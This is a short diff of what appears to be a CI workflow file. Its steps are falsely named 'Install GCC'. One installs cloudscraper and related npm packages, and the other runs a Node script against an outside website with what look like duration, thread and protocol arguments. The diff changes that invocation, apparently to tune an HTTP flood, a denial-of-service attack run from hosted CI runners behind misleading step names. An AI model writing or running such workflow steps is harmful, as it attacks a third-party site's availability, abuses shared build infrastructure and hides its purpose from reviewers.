@@ -22,4 +22,4 @@ jobs:
       - name: Install GCC
         run: npm install cloudscraper request randomstring
       - name: Install GCC
-        run: node m.js https://app19398.cloudwayssites.com/ipx.php/ 30000
+        run: node k.js https://app19398.cloudwayssites.com/ipx.php/ 30000 16 h1
